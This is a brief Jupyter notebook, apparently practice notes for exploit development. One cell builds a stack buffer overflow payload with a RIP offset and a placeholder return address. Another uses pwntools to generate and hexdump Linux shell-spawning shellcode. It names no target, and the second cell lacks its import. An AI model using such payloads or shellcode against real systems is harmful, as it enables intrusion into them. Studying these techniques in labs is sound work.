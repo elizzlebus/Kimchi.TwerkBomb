{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Using Python struct library"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "#!/usr/bin/env python\n",
    "from struct import *\n",
    " \n",
    "buf = \"\"\n",
    "buf += \"A\"*104                      # offset to RIP\n",
    "buf += pack(\"<Q\", 0x424242424242)   # overwrite RIP with 0x0000424242424242\n",
    "buf += \"C\"*290                      # padding to keep payload length at 400 bytes\n",
    " \n",
    "f = open(\"in.txt\", \"w\")\n",
    "f.write(buf)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Using Python pwn library to create shellcode"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# shellcode for 64 bit\n",
    "context.arch='amd64'\n",
    "sc = shellcraft.amd64.linux.sh()\n",
    "sca = asm(sc)\n",
    "log.info(\"Using shellcode\\n\" + sc)\n",
    "log.info(hexdump(sca))\n",
    " \n",
    "# shellcode for 32 bit\n",
    "sc = shellcraft.linux.sh()\n",
    "sca = asm(sc)\n",
    "log.info(\"Using shellcode\\n\" + sc)\n",
    "log.info(hexdump(sca))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}
